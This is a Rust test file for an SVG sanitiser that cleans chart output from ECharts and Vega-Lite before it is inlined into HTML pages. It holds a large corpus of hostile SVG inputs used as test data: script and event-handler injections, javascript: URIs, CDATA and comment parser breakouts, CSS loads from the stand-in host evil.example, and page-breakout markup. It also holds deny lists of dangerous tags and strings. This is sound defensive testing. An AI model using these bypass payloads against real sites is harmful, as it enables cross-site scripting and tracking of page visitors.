//! sanitize_svg on real chart output and on hostile SVG.
//!
//! The chart SVGs in `tests/data/svg/` are real output of ECharts 5.6.0 (SSR
//! SVG) and Vega-Lite 5.23.0 / Vega 5.33.1, made by `tests/data/svg/generate.js`.

mod common;

use blitz_dom::{BaseDocument, DocumentConfig, FontContext};
use blitz_html::HtmlDocument;
use parley::fontique::{Collection, CollectionOptions, SourceCache};
use roxmltree::{Document, Node};
use surimono_gfx::{FontSet, GenericFamily, GfxError, TextMeasurer, sanitize_svg};

const ECHARTS: &str = include_str!("data/svg/echarts-5.6.0-bar-line.svg");
const VEGA: &str = include_str!("data/svg/vega-lite-5.23.0-bar.svg");
const STACK: &str = "'Noto Sans', 'Noto Sans JP'";

#[test]
fn echarts_output_changes_only_ids_fonts_and_style() {
    let fonts = common::test_fonts();
    let out = sanitize_svg(ECHARTS, 2, &fonts).unwrap();
    Document::parse(&out).expect("output is well-formed XML");

    assert!(out.contains(r#"id="sm2-zr0-g0""#));
    assert!(out.contains(r#"fill="url(#sm2-zr0-g0)""#));
    assert!(out.contains(r#"clip-path="url(#sm2-zr0-c0)""#));
    assert!(out.contains(&format!("font-family:{STACK};")));
    assert!(!out.contains("sans-serif"));
    assert!(!out.contains("<style"));

    // Undo exactly those rewrites: what is left must equal the input byte
    // for byte without its <style> (hover rules only; no XML prolog).
    let undone = out.replace("sm2-", "").replace(STACK, "sans-serif");
    let style = ECHARTS.find("<style").unwrap()..ECHARTS.find("</style>").unwrap() + 8;
    let expected = format!("{}{}", &ECHARTS[..style.start], &ECHARTS[style.end..]);
    assert_eq!(undone, expected.trim_end());
}

#[test]
fn vega_output_changes_only_fonts() {
    let fonts = common::test_fonts();
    let out = sanitize_svg(VEGA, 0, &fonts).unwrap();
    Document::parse(&out).expect("output is well-formed XML");
    let attr = format!("font-family=\"{STACK}\"");
    assert_eq!(out.matches(&attr).count(), 16);
    // The root loses `class="marks"`: the page's CSS could match it.
    assert_eq!(
        out.replace(&attr, "font-family=\"sans-serif\""),
        VEGA.trim_end().replacen(" class=\"marks\"", "", 1)
    );
}

#[test]
fn rewritten_families_measure_like_the_original() {
    let mut fonts = common::test_fonts();
    fonts
        .set_generic_family(GenericFamily::Monospace, &["Noto Sans JP"])
        .unwrap();
    let measurer = TextMeasurer::new(fonts.clone());
    for (original, text) in [
        ("sans-serif", "Revenue 売上"),
        ("monospace", "Q1 2026"),
        ("Arial, Helvetica", "Label"),
        ("'Noto Sans JP', serif", "日本 Japan"),
        ("Unknown", "x"),
    ] {
        let svg = format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\"><text font-family=\"{original}\">{text}</text></svg>"
        );
        let out = sanitize_svg(&svg, 0, &fonts).unwrap();
        let doc = Document::parse(&out).unwrap();
        let rewritten = doc
            .descendants()
            .find(|n| n.has_tag_name("text"))
            .and_then(|n| n.attribute("font-family"))
            .unwrap()
            .to_string();
        // The new list names only registered families, in the order
        // measurement resolved them...
        assert_eq!(
            fonts.resolve_families(&rewritten),
            fonts.resolve_families(original),
            "{original}"
        );
        // ...so text in it measures exactly like text in the original.
        let a = measurer
            .measure(text, &format!("bold 13px {original}"))
            .unwrap();
        let b = measurer
            .measure(text, &format!("bold 13px {rewritten}"))
            .unwrap();
        assert_eq!(a, b, "{original} -> {rewritten}");
    }
    assert_eq!(
        fonts.resolve_families("monospace"),
        vec!["Noto Sans JP", "Noto Sans"]
    );
}

#[test]
fn font_shorthand_in_style_attributes() {
    let fonts = common::test_fonts();
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><text style='font: italic 10px serif; fill: red'>a</text><text style="font:bold 12px/1.2 Arial !important;font-family:monospace">b</text></svg>"#;
    let out = sanitize_svg(svg, 0, &fonts).unwrap();
    assert_eq!(
        out,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><text style='font: italic 10px "Noto Sans", "Noto Sans JP"; fill: red'>a</text><text style="font:bold 12px/1.2 'Noto Sans', 'Noto Sans JP' !important;font-family:'Noto Sans', 'Noto Sans JP'">b</text></svg>"#
    );
}

#[test]
fn deterministic_and_unique_per_island() {
    let fonts = common::test_fonts();
    let a1 = sanitize_svg(ECHARTS, 1, &fonts).unwrap();
    let a2 = sanitize_svg(ECHARTS, 1, &fonts).unwrap();
    let b = sanitize_svg(ECHARTS, 7, &fonts).unwrap();
    assert_eq!(a1, a2);
    let ids = |s: &str| -> Vec<String> {
        Document::parse(s)
            .unwrap()
            .descendants()
            .filter_map(|n| n.attribute("id").map(str::to_string))
            .collect()
    };
    let (ia, ib) = (ids(&a1), ids(&b));
    assert!(!ia.is_empty());
    assert!(ia.iter().all(|id| !ib.contains(id)), "{ia:?} vs {ib:?}");
}

/// Classic SVG and HTML-inlining attacks. Each must come out with nothing
/// that runs or loads, or be rejected.
const HOSTILE: &[&str] = &[
    r#"<svg onload="alert(1)"/>"#,
    r#"<svg><script>alert(1)</script></svg>"#,
    r#"<svg xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="data:text/javascript,alert(1)"/></svg>"#,
    r#"<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><rect/></a></svg>"#,
    r#"<svg><a href="&#106;ava&#x0A;script:alert(1)"><rect/></a></svg>"#,
    r#"<svg><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><rect/></a></svg>"#,
    r#"<svg><a><animate attributeName="href" values="javascript:alert(1)"/><rect/></a></svg>"#,
    r#"<svg><rect><set attributeName="onmouseover" to="alert(1)"/></rect></svg>"#,
    r#"<svg><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"/></foreignObject></svg>"#,
    r#"<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></body></foreignObject></svg>"#,
    r#"<svg><style>@import url(https://evil.example/x.css);</style></svg>"#,
    r#"<svg><style>@import 'https://evil.example/x.css';</style></svg>"#,
    r#"<svg><style>rect{background:url("https://evil.example/x.png")}</style><rect/></svg>"#,
    r#"<svg><style>@font-face{font-family:x;src:url(https://evil.example/f.woff2)}</style></svg>"#,
    r#"<svg><style>rect{background:u\72l(https://evil.example/x.png)}</style></svg>"#,
    r#"<svg><style>@\69mport 'https://evil.example/x.css';</style></svg>"#,
    r#"<svg><image href="https://evil.example/track.png"/></svg>"#,
    r#"<svg><image href=" JAVASCRIPT:alert(1)"/></svg>"#,
    r#"<svg><use href="https://evil.example/sprite.svg#a"/></svg>"#,
    r#"<svg><filter><feImage href="http://evil.example/"/></filter></svg>"#,
    r#"<svg><linearGradient id="x" href="https://evil.example/g.svg#y"/></svg>"#,
    r#"<svg><path style="fill:url(https://evil.example/#a)"/></svg>"#,
    r#"<svg><path fill="url('https://evil.example/#a')"/></svg>"#,
    r#"<svg><path fill="u\72l(https://evil.example/#a)"/></svg>"#,
    r#"<svg><p><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></p></svg>"#,
    r#"<svg><title><![CDATA[</title><script>alert(1)</script>]]></title></svg>"#,
    r#"<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc></svg>"#,
    r#"<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>"#,
    r#"<svg><math><mtext><table><mglyph><style><img src="x" onerror="alert(1)"/></style></mglyph></table></mtext></math></svg>"#,
    r#"<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>"#,
    r#"<svg><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"/><embed src="x.swf"/><object data="x"/></svg>"#,
    r#"<svg><foreignObject><link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="https://evil.example/x.css"/><meta http-equiv="refresh" content="0;url=https://evil.example"/></foreignObject></svg>"#,
    r#"<svg><a href="https://example.com/ok"><text>ok</text></a></svg>"#,
    r#"<svg><text>&lt;script&gt;alert(1)&lt;/script&gt;</text></svg>"#,
    r##"<svg xml:base="https://evil.example/"><use href="#a"/></svg>"##,
    r#"<svg><!-- --!><img src=x onerror=alert(1)> --></svg>"#,
    r#"<svg><svg onload="alert(1)"/></svg>"#,
    r#"<svg><foreignObject><svg xmlns="http://www.w3.org/2000/svg"><p>x</p></svg></foreignObject></svg>"#,
    // Review of #12: in an HTML integration point <style> is raw text, so an
    // entity hid a quote from the scanner while the browser saw none.
    r#"<svg xmlns="http://www.w3.org/2000/svg"><desc><style>.x{a:&#34;}*{background:url(https://evil.example/desc.png)}</style></desc><rect width="10" height="10"/></svg>"#,
    r#"<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><style xmlns="http://www.w3.org/1999/xhtml">.x{a:&#34;}*{background:url(https://evil.example/fo.png)}</style><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject></svg>"#,
    r#"<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi><style xmlns="http://www.w3.org/1999/xhtml">.x{a:&#34;}*{background:url(https://evil.example/mi.png)}</style></mi></math></foreignObject></svg>"#,
    r#"<svg><title><style>.x{a:&#39;}*{background:url(https://evil.example/t.png)}</style></title></svg>"#,
    r#"<svg><desc><style>.x{a:&#47;&#42;}*{background:url(https://evil.example/c.png)}</style></desc></svg>"#,
    // A string split across text nodes by a (removed) comment or by a child
    // element whose markup is CSS text to an HTML parser.
    r#"<svg><style>.x{a:"<!-- -->"}*{background:url(https://evil.example/split.png)}</style><rect/></svg>"#,
    r#"<svg><foreignObject><style xmlns="http://www.w3.org/1999/xhtml">.y{a:'<i b="'}*{background:url(https://evil.example/elem.png)}'"/>}</style></foreignObject></svg>"#,
    r#"<svg><desc><style>.z{}]]&gt;*{background:url(https://evil.example/cd.png)}</style></desc></svg>"#,
    // @font-face reaches system fonts through local().
    r#"<svg><style>@font-face{font-family:x;src:local(Arial)}text{font-family:x}</style><text>a</text></svg>"#,
    // Second review of #12 (19 cases, Chromium 153). A: CR from `&#13;` is a
    // newline to CSS and ends a string.
    r#"<svg width="100" height="100"><foreignObject width="100" height="100"><div xmlns="http://www.w3.org/1999/xhtml" style="x:'&#13;;background:url(https://evil.example/a1.png);y:'">a</div></foreignObject></svg>"#,
    r#"<svg width="10" height="10" style="x:'&#13;;background:url(https://evil.example/a2.png);y:'"><rect width="10" height="10"/></svg>"#,
    r#"<svg width="10" height="10" style="x:&quot;&#xD;;background-image:url(https://evil.example/a3.png);y:&quot;"><rect width="10" height="10"/></svg>"#,
    // G: an unquoted url( is one token; `(` or `/*` inside it neither nests
    // nor opens a comment.
    r#"<svg width="10" height="10"><style>@x url(a(b);@import "https://evil.example/g1.css";</style><rect width="10" height="10"/></svg>"#,
    r#"<svg width="10" height="10"><style>@x url(a(b);svg{background:image-set("https://evil.example/g2.png" 1x)}</style><rect width="10" height="10"/></svg>"#,
    r#"<svg width="10" height="10"><style>@x url(a(b);@font-face{font-family:Q;src:local(Arial)}</style><text font-family="Q">a</text></svg>"#,
    r#"<svg width="10" height="10"><style>@x url(/*);@import "https://evil.example/g4.css";/**/</style><rect width="10" height="10"/></svg>"#,
    r#"<svg width="100" height="100"><foreignObject width="100" height="100"><style xmlns="http://www.w3.org/1999/xhtml">@x url(a(b);@import "https://evil.example/g5.css";</style><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject></svg>"#,
    // D: presentation attributes load through image-set().
    r#"<svg width="10" height="10"><rect width="10" height="10" mask="image-set('https://evil.example/d1.png' 1x)"/></svg>"#,
    r#"<svg width="10" height="10"><rect width="10" height="10" mask="-webkit-image-set('https://evil.example/d2.png' 1x)"/></svg>"#,
    r#"<svg width="10" height="10"><rect width="10" height="10" cursor="image-set('https://evil.example/d3.png' 1x), auto"/></svg>"#,
    // B: a namespaced x:attributeName hid the real one from the sanitiser.
    r#"<svg xmlns:x="urn:x" width="10" height="10"><image width="10" height="10"><set x:attributeName="opacity" attributeName="href" to="https://evil.example/b1.png"/></image></svg>"#,
    r#"<svg xmlns:x="urn:x" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10"><image width="10" height="10" xlink:href="data:image/png;base64,AA"><set x:attributeName="opacity" attributeName="xlink:href" to="https://evil.example/b2.png"/></image></svg>"#,
    r##"<svg xmlns:x="urn:x" width="10" height="10"><filter id="f"><feImage width="10" height="10"><set x:attributeName="opacity" attributeName="href" to="https://evil.example/b3.png"/></feImage></filter><rect width="10" height="10" filter="url(#f)"/></svg>"##,
    // C: SMIL values with escapes or image-set().
    r#"<svg width="10" height="10"><rect width="10" height="10"><set attributeName="filter" to="u\72l(https://evil.example/c1.svg#f)"/></rect></svg>"#,
    r#"<svg width="10" height="10"><rect width="10" height="10"><set attributeName="mask" to="u\72l(https://evil.example/c2.svg#m)"/></rect></svg>"#,
    r#"<svg width="10" height="10"><rect width="10" height="10"><set attributeName="fill" to="u\72l(https://evil.example/c3.svg#p)"/></rect></svg>"#,
    r#"<svg width="10" height="10"><rect width="10" height="10"><set attributeName="mask" to="image-set('https://evil.example/c4.png' 1x)"/></rect></svg>"#,
    // Control: nothing to remove but the id prefix.
    r##"<svg width="10" height="10"><linearGradient id="g"/><rect width="10" height="10" fill="url(#g)"/></svg>"##,
    // Other at-rules and loading functions.
    r#"<svg><style>@namespace x url(https://evil.example/ns);@page{size:1mm}@media print{@import "https://evil.example/m.css";}a{b:src("https://evil.example/s")}</style></svg>"#,
    r#"<svg><style>a{--x:url(https://evil.example/v.png);background:var(--x)}</style><rect style="--y:url('https://evil.example/w.png')"/></svg>"#,
    // Third review of #12: URLs that passed as data:image/ but that a URL
    // parser reads as relative (fetched from the page's own origin).
    r#"<svg width="10" height="10"><image width="10" height="10" href="d ata:image/../../r1.png"/></svg>"#,
    r#"<svg width="10" height="10"><image width="10" height="10" href="data :image/png,x"/></svg>"#,
    r#"<svg width="10" height="10"><image width="10" height="10" href="da&#x80;ta:image/../../r3.png"/></svg>"#,
    "<svg width=\"10\" height=\"10\"><image width=\"10\" height=\"10\" href=\"da\u{85}ta:image/../../r4.png\"/></svg>",
    r#"<svg width="10" height="10"><image width="10" height="10" href="&#x3000;data:image/../r5.png"/></svg>"#,
    r##"<svg width="10" height="10"><filter id="f"><feImage width="10" height="10" href="d ata:image/../r6.png"/></filter><rect width="10" height="10" filter="url(#f)"/></svg>"##,
    r#"<svg width="10" height="10"><rect width="10" height="10" style="cursor:url('d ata:image/../r7.png'),auto"/></svg>"#,
    r#"<svg width="10" height="10"><rect width="10" height="10" mask="url('d ata:image/../r8.svg#m')"/></svg>"#,
    r#"<svg width="10" height="10"><rect width="10" height="10" filter="url('d ata:image/../r9.svg#f')"/></svg>"#,
    r#"<svg width="10" height="10"><rect width="10" height="10" style="fill:url('d&#x80;ata:image/../r11.svg#p')"/></svg>"#,
    r#"<svg width="10" height="10"><a href="&#x3000;https://evil.example/r12"><rect width="10" height="10"/></a></svg>"#,
    // The page's own CSS matches the root's class or role.
    r#"<svg width="10" height="10" class="fixed inset-0 z-50" role="dialog"><rect width="10" height="10"/></svg>"#,
];

/// Cases where the attacker's URL may stay in the output, but only as text
/// inside a CSS string, where it loads nothing (checked in Chrome by
/// `tests/chrome/svg_inline.mjs`).
const HOSTILE_INERT_TEXT: &[&str] = &[
    // XML reads a literal newline in an attribute as a space, HTML keeps it
    // and CSS ends the string there. The value is written again as XML read
    // it (one string), so the browser reads it the same way.
    "<svg width=\"10\" height=\"10\" style=\"x:'\n;background-image:url(https://evil.example/l1.png);y:'\"><rect width=\"10\" height=\"10\"/></svg>",
    "<svg width=\"10\" height=\"10\"><rect width=\"10\" height=\"10\" style=\"x:&quot;\n;background-image:url(https://evil.example/l2.png);y:&quot;\"/></svg>",
];

#[test]
fn hostile_svg_is_neutralised() {
    let fonts = common::test_fonts();
    let mut rejected = 0;
    let mut cleaned = Vec::new();
    for input in HOSTILE_INERT_TEXT {
        let out = sanitize_svg(input, 0, &fonts).unwrap_or_else(|e| panic!("{input}: {e}"));
        let doc = Document::parse(&out).unwrap_or_else(|e| panic!("{input} -> {out}: {e}"));
        check_safe(doc.root_element(), false, input, &out);
        // What the browser sees in the style attribute is one CSS string.
        let style = doc
            .descendants()
            .find_map(|n| n.attribute("style"))
            .unwrap_or_else(|| panic!("{input} -> {out}: style kept"));
        assert!(!style.contains('\n'), "{input} -> {out}");
        cleaned.push(serde_json::json!({ "input": input, "output": out }));
    }
    for input in HOSTILE.iter().chain(BREAKOUTS) {
        let out = match sanitize_svg(input, 0, &fonts) {
            Ok(out) => {
                cleaned.push(serde_json::json!({ "input": input, "output": out }));
                out
            }
            Err(GfxError::InvalidSvg { .. }) => {
                rejected += 1;
                continue;
            }
            Err(e) => panic!("{input}: unexpected {e}"),
        };
        let doc = Document::parse(&out).unwrap_or_else(|e| panic!("{input} -> {out}: {e}"));
        check_safe(doc.root_element(), false, input, &out);
        // Attribute names are checked structurally above (escaped text such
        // as `&lt;img onerror=...&gt;` is inert); these must not appear at all.
        let lower = out.to_ascii_lowercase();
        for bad in [
            "<script",
            "javascript:",
            "@import",
            "evil.example",
            "cdata",
            "font-face",
            "local(",
        ] {
            assert!(!lower.contains(bad), "{input}\n -> {out}\n contains {bad}");
        }
    }
    // Only the malformed comment and the prefixed root are rejected;
    // everything else is cleaned.
    assert_eq!(rejected, 2);
    // For tests/chrome/svg_inline.mjs, which inlines these into a page in Chrome.
    let path = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join("hostile-svg.json");
    std::fs::write(&path, serde_json::to_string_pretty(&cleaned).unwrap()).unwrap();
    println!("wrote {}", path.display());
}

fn check_safe(node: Node<'_, '_>, in_html: bool, input: &str, out: &str) {
    let name = node.tag_name().name().to_ascii_lowercase();
    assert!(
        ![
            "script", "iframe", "embed", "object", "handler", "link", "meta"
        ]
        .contains(&name.as_str()),
        "{input} -> {out}: <{name}>"
    );
    if !in_html {
        assert!(
            !["p", "table", "img", "div", "span", "font", "body"].contains(&name.as_str()),
            "{input} -> {out}: <{name}> outside foreignObject"
        );
    }
    for a in node.attributes() {
        let n = a.name().to_ascii_lowercase();
        assert!(!n.starts_with("on"), "{input} -> {out}: {n}");
        if n == "href" || n == "src" {
            let v = a.value();
            assert!(
                v.starts_with('#')
                    || v.starts_with("data:image/")
                    || (name == "a" && v.starts_with("https://")),
                "{input} -> {out}: {n}={v}"
            );
        }
    }
    // As an HTML parser decides it: SVG and MathML start foreign content;
    // foreignObject, desc and title (and MathML's mi, mo, mn, ms, mtext
    // inside <math>) hold HTML again.
    let child_html = if in_html {
        name != "svg" && name != "math"
    } else {
        ["foreignobject", "desc", "title"].contains(&name.as_str())
            || (node.tag_name().namespace() == Some("http://www.w3.org/1998/Math/MathML")
                && ["mi", "mo", "mn", "ms", "mtext"].contains(&name.as_str()))
    };
    for c in node.children().filter(|c| c.is_element()) {
        check_safe(c, child_html, input, out);
    }
}

#[test]
fn errors_are_typed() {
    let fonts = FontSet::new();
    let err = sanitize_svg("<html/>", 0, &fonts).unwrap_err();
    assert_eq!(
        err.to_string(),
        "invalid SVG: the root element is <html>, not <svg>"
    );
}

/// The page `surimono` builds around an island (one `div.surimono-island`
/// per island), parsed by html5ever through blitz-html, the HTML parser
/// fulgur uses.
fn parse_page(svg: &str) -> HtmlDocument {
    let html = format!(
        "<!doctype html><html lang=\"en\"><head><title>p</title></head><body class=\"page\">\
         <p id=\"before\">a</p><div class=\"surimono-island\" id=\"island\">{svg}</div>\
         <p id=\"after\">b</p><p id=\"total\">c</p></body></html>"
    );
    let font_ctx = FontContext {
        collection: Collection::new(CollectionOptions {
            system_fonts: false,
            ..Default::default()
        }),
        source_cache: SourceCache::new(Default::default()),
    };
    HtmlDocument::from_html(
        &html,
        DocumentConfig {
            font_ctx: Some(font_ctx),
            ..DocumentConfig::default()
        },
    )
}

fn elements<'a>(doc: &'a BaseDocument, node: &blitz_dom::Node) -> Vec<&'a blitz_dom::Node> {
    node.children
        .iter()
        .filter_map(|&id| doc.get_node(id))
        .filter(|n| n.is_element())
        .collect()
}

fn name(node: &blitz_dom::Node) -> (String, String) {
    node.element_data()
        .map(|e| (e.name.ns.to_string(), e.name.local.to_string()))
        .unwrap_or_default()
}

fn attrs(node: &blitz_dom::Node) -> Vec<(String, String)> {
    node.element_data()
        .map(|e| {
            e.attrs()
                .iter()
                .map(|a| (a.name.local.to_string(), a.value.clone()))
                .collect()
        })
        .unwrap_or_default()
}

/// Whether an island stays in its own box once inlined: the page around it
/// keeps its shape and attributes, no `<style>` is anywhere, everything in
/// the island is SVG, and the root `<svg>` has no box-moving style.
fn contained(svg: &str) -> Result<(), String> {
    const HTML_NS: &str = "http://www.w3.org/1999/xhtml";
    const SVG_NS: &str = "http://www.w3.org/2000/svg";
    let doc = parse_page(svg);
    let html = doc.root_element();
    if attrs(html) != [("lang".to_string(), "en".to_string())] {
        return Err(format!("html attributes {:?}", attrs(html)));
    }
    let body = elements(&doc, html)
        .into_iter()
        .find(|n| name(n).1 == "body")
        .ok_or("no body")?;
    if attrs(body) != [("class".to_string(), "page".to_string())] {
        return Err(format!("body attributes {:?}", attrs(body)));
    }
    let kids: Vec<(String, String)> = elements(&doc, body)
        .iter()
        .map(|n| {
            let id = attrs(n)
                .into_iter()
                .find(|(k, _)| k == "id")
                .map(|(_, v)| v);
            (name(n).1, id.unwrap_or_default())
        })
        .collect();
    let expected = [
        ("p", "before"),
        ("div", "island"),
        ("p", "after"),
        ("p", "total"),
    ];
    if kids.len() != 4
        || kids
            .iter()
            .zip(expected)
            .any(|((n, i), (en, ei))| n != en || i != ei)
    {
        return Err(format!("body children {kids:?}"));
    }
    // Nothing anywhere is a <style>.
    let mut stack = vec![html];
    while let Some(n) = stack.pop() {
        if name(n).1.eq_ignore_ascii_case("style") {
            return Err("a style element".into());
        }
        stack.extend(elements(&doc, n));
    }
    // Inside the wrapper: one <svg>, and only SVG elements below it.
    let island = elements(&doc, body)[1];
    let roots = elements(&doc, island);
    if roots.len() != 1 || name(roots[0]) != (SVG_NS.into(), "svg".into()) {
        return Err(format!(
            "island holds {:?}",
            roots.iter().map(|n| name(n)).collect::<Vec<_>>()
        ));
    }
    if attrs(roots[0]).iter().any(|(k, _)| k == "class") {
        return Err("the root keeps a class the page's CSS can match".into());
    }
    let style = attrs(roots[0])
        .into_iter()
        .find(|(k, _)| k == "style")
        .map(|(_, v)| v.to_ascii_lowercase())
        .unwrap_or_default();
    for bad in [
        "position",
        "transform",
        "z-index",
        "float",
        "display",
        "visibility",
        "overflow",
        "margin",
    ] {
        if style.contains(bad) {
            return Err(format!("root style has {bad}: {style}"));
        }
    }
    let mut stack = roots;
    while let Some(n) = stack.pop() {
        let (ns, local) = name(n);
        if ns != SVG_NS {
            return Err(format!(
                "<{local}> in {ns}{}",
                if ns == HTML_NS { " (HTML)" } else { "" }
            ));
        }
        stack.extend(elements(&doc, n));
    }
    Ok(())
}

/// Islands that reached the page around them (review of #25, with a
/// spec-following HTML5 parser). Each breaks containment raw, none does
/// sanitized.
const BREAKOUTS: &[&str] = &[
    // Page-wide CSS from a hostile ECharts value (an emphasis colour).
    "<svg width=\"10\" height=\"10\"><rect class=\"zr0-cls-1\"/><style><![CDATA[.zr0-cls-1:hover{fill:red;}body{display:none} #total{visibility:hidden}]]></style></svg>",
    // desc and title read their children as HTML: these swallow the page.
    "<svg width=\"10\" height=\"10\"><desc><textarea/></desc><rect/></svg>",
    "<svg width=\"10\" height=\"10\"><title><select/></title><rect/></svg>",
    "<svg width=\"10\" height=\"10\"><desc><plaintext/></desc></svg>",
    // A self-closing XHTML div moves the page after the island into it.
    "<svg width=\"10\" height=\"10\"><foreignObject width=\"10\" height=\"10\"><div xmlns=\"http://www.w3.org/1999/xhtml\"/></foreignObject></svg>",
    // <body>/<html> add their attributes to the page's own.
    "<svg width=\"10\" height=\"10\"><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\" dir=\"rtl\" style=\"display:none\"/></foreignObject></svg>",
    "<svg width=\"10\" height=\"10\"><desc><html dir=\"rtl\"><body style=\"display:none\"/></html></desc></svg>",
    // The root svg over every printed page.
    "<svg width=\"10\" height=\"10\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999\"><rect/></svg>",
    // Links and forms in foreignObject.
    "<svg width=\"10\" height=\"10\"><foreignObject width=\"10\" height=\"10\"><form xmlns=\"http://www.w3.org/1999/xhtml\" action=\"https://evil.example/\"><input name=\"q\"/></form><a xmlns=\"http://www.w3.org/1999/xhtml\" href=\"https://evil.example/\">x</a></foreignObject></svg>",
    // The page's utility CSS (Tailwind) would fix the root over the page.
    "<svg width=\"10\" height=\"10\" class=\"fixed inset-0 z-50\"><rect/></svg>",
    // A prefixed root is an unknown HTML element: its children are HTML.
    "<svg:svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\"><textarea/></svg:svg>",
];

#[test]
fn islands_stay_in_their_box() {
    let fonts = common::test_fonts();
    // Control: the parser and the check see each raw breakout.
    for input in BREAKOUTS {
        assert!(
            contained(input).is_err(),
            "raw input stays contained: {input}"
        );
    }
    let all = BREAKOUTS
        .iter()
        .chain(HOSTILE)
        .chain(HOSTILE_INERT_TEXT)
        .chain([&ECHARTS, &VEGA]);
    for input in all {
        match sanitize_svg(input, 0, &fonts) {
            Ok(out) => {
                if let Err(e) = contained(&out) {
                    panic!("{input}\n -> {out}\n breaks out: {e}");
                }
            }
            Err(GfxError::InvalidSvg { .. }) => {}
            Err(e) => panic!("{input}: unexpected {e}"),
        }
    }
}
